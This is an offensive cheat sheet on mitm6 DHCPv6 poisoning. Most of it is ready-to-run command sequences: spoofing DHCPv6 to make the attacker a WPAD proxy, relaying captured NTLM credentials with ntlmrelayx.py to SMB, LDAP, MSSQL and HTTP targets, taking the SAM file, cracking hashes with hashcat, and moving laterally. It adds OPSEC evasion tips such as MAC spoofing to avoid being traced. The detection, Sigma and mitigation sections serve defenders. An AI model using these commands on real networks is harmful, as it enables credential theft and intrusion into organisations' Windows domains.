# mitm6 — DHCPv6 Poisoning

Exploit IPv6's precedence over IPv4 in Windows. Spoof DHCPv6 replies to set the attacker as a WPAD proxy, then capture or relay NTLM credentials when any victim makes an HTTP request.

## How It Works

```
Attacker sends fake DHCPv6 Advertise with DNS server = attacker IP
Victim does DHCPv6 request ──► configures IPv6 DNS = attacker
  └─► Victim's WPAD query for wpad.dat ──► Attacker's rogue WPAD server
    └─► Victim sends HTTP requests through attacker's proxy
      └─► NetNTLMv2 hash captured / relayed
```

## Prerequisites

- Local network access (same subnet)
- IPv6 enabled on target machines (default on modern Windows)
- No DHCPv6 guard or RA guard enabled
- No IPv6 DNS servers configured via Group Policy

## Linux — mitm6 + ntlmrelayx.py

### Basic mitm6
```bash
sudo mitm6 -d domain.local -i eth0
```

### mitm6 with specific domain and relay target
```bash
sudo mitm6 -d domain.local -i eth0 -m
```

### Full attack: mitm6 + ntlmrelayx.py to SMB target
```bash
# Terminal 1: Start mitm6
sudo mitm6 -d domain.local -i eth0

# Terminal 2: Relay captured hashes to target
ntlmrelayx.py -6 -wh 10.10.10.5 -t smb://10.10.10.10 -smb2support
```
- `-6` — Enable IPv6
- `-wh` — WPAD host (attacker's IP for WPAD queries)
- `-t` — Relay target

### Relay to LDAP (for delegation abuse)
```bash
ntlmrelayx.py -6 -wh 10.10.10.5 -t ldap://10.10.10.10 -smb2support --delegate-access
```

### Relay to MS-SQL
```bash
ntlmrelayx.py -6 -wh 10.10.10.5 -t mssql://10.10.10.10 -smb2support
```

### Relay to HTTP endpoint
```bash
ntlmrelayx.py -6 -wh 10.10.10.5 -t http://10.10.10.10 -smb2support
```

### Capture to file instead of relay
```bash
ntlmrelayx.py -6 -wh 10.10.10.5 -t smb://10.10.10.10 -smb2support -l loot
```

## mitm6 Options

```bash
# Full help
sudo mitm6 -h

# Specify domain (filter which domain to respond for)
sudo mitm6 -d domain.local -i eth0

# Ignore domains (comma-separated)
sudo mitm6 -d domain.local -i eth0 --ignore microsoft.com

# Specify machine DNS suffix
sudo mitm6 -d domain.local -i eth0 --domain domain.local

# Verbose output
sudo mitm6 -d domain.local -i eth0 -v

# MAC address spoofing
sudo mitm6 -d domain.local -i eth0 -m aa:bb:cc:dd:ee:ff
```

## Attack Flow with WPAD + Credential Capture

```bash
# 1. Start mitm6 (spoofs DHCPv6, poisons DNS)
sudo mitm6 -d domain.local -i eth0

# 2. In separate terminal, start ntlmrelayx.py (relay OR capture)
ntlmrelayx.py -6 -wh 10.10.10.5 -t smb://10.10.10.10 -smb2support

# 3. Victims will:
#    - Get fake DHCPv6 lease with attacker as DNS
#    - Attempt WPAD (http://wpad/wpad.dat) via attacker's DNS
#    - Send NTLM auth to attacker's relay server
#    - Relay forwards to SMB target

# 4. If relay succeeds, ntlmrelayx.py drops a shell:
#    - smb> shares
#    - smb> use C$
#    - smb> get SAM
```

## Pure Capture (No Relay)

```bash
# Terminal 1: mitm6
sudo mitm6 -d domain.local -i eth0

# Terminal 2: ntlmrelayx.py with local capture
ntlmrelayx.py -6 -wh 10.10.10.5 -t smb://localhost -smb2support -l lootdir
```

## Cracking Captured Hashes

```bash
# Same NetNTLMv2 format as Responder — mode 5600
hashcat -m 5600 lootdir/*.txt /usr/share/wordlists/rockyou.txt -r best64.rule

# Show results
hashcat -m 5600 lootdir/*.txt --show
```

## Full Attack Flow

```
1. Identify target subnet (Windows clients, IPv6 enabled)
   nmap -sn 10.10.10.0/24

2. Start mitm6
   sudo mitm6 -d domain.local -i eth0

3. Start relay to domain controller SMB
   ntlmrelayx.py -6 -wh 10.10.10.5 -t smb://10.10.10.10 -smb2support

4. Wait for victim traffic (user opens browser, Outlook, etc.)
   [mitm6] DHCP attempting to set DNS fe80::xxxx
   [ntlmrelayx] HTTP server returned 200
   [ntlmrelayx] SMBD: Received connection from 10.10.10.50
   [ntlmrelayx] Got NTLMv2 hash from DOMAIN\jsmith

5. Relay dumps SAM or gives shell
   - OR capture hash and crack offline

6. Use compromised credentials for lateral movement
```

## Detection & Signatures

**Network Signatures:**
- DHCPv6 Solicit/Request followed by Advertise/Reply from rogue source
- Router Advertisement (RA) from non-router devices
- Multiple DHCPv6 assignments from the same MAC in short time
- DNS traffic for 'wpad' hostname (WPAD queries)
- WPAD.dat served from non-DHCP-allowed host

**Windows Traces:**
- IPv6 DNS server set to link-local address (fe80::/10) not from authorized DHCPv6
- **Event ID 50036** — DHCPv6 Client event
- **Event ID 5100/5101** — WinHTTP WPAD proxy detection

**DHCPv6 Guard (Cisco/network gear):**
- `ipv6 dhcp guard` — Blocks rogue DHCPv6 servers on access ports

**Sigma Rules:**
```yaml
title: DHCPv6 Rogue Server
detection:
  selection:
    EventID: 50036
    DHCPv6MessageType: 'Advertise'
  condition: selection | count() by SourceIP > 5
```

## OPSEC Considerations

- **Very loud** — ICMPv6 RA and DHCPv6 traffic is broadcast
- **Network teams will notice** — DHCPv6 guard alerts, RA guard alerts
- **mitm6 is well-known** — Signature-based detection exists
- **Use spoofed MAC** — Option `-m` to avoid tracing back to you
- **Filter domain** — Only respond for target domain to avoid noise
- **Kill upon detection** — Stop immediately if network tools respond
- **Timebox** — Run for short periods (30 min max) to avoid exposure
- **Combine with Responder** — mitm6+Responder on same interface

## Defenses

- **Disable IPv6** — If not needed, disable on all adapters
- **DHCPv6 Guard** — Enable on managed switches (blocks rogue DHCPv6)
- **RA Guard** — Enable on managed switches (blocks rogue router advertisements)
- **Block WPAD via GPO** — Disable WinHTTP auto-proxy discovery
- **DNS configuration** — Static IPv6 DNS servers via GPO (overrides router/DHCPv6)
- **SMB signing** — Required on all systems (prevents relay, not capture)
- **Network Access Control (NAC)** — 802.1X blocks unauthorized devices

**Verify mitm6 & WPAD risk:**
```powershell
# Check WPAD setting
Get-ItemProperty "HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Wpad"
Get-ItemProperty "HKLM:\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Wpad"

# Check IPv6 DNS config
Get-DnsClientServerAddress -AddressFamily IPv6
```

## Common Pitfalls

| Issue | Fix |
|-------|-----|
| No IPv6 traffic from victims | Check IPv6 is enabled (`ipconfig /all`) |
| Relay fails (STATUS_ACCESS_DENIED) | Target requires signing; try non-SMB target |
| WPAD not queried | Disabled by GPO; try HTTP capture instead |
| mitm6 sets DNS but no auth comes | Wait for HTTP traffic; Outlook/Edge trigger WPAD |
| Multiple DCs cause interference | Use `--domain` filter strictly |

## References

- mitm6: https://github.com/dirkjanm/mitm6
- ntlmrelayx.py (Impacket): https://github.com/fortra/impacket
- Dirk-jan Molenaar: "mitm6 - compromising IPv4 networks via IPv6" (BSidesLondon 2018)
- Microsoft: "Mitigating IPv6-based attacks"
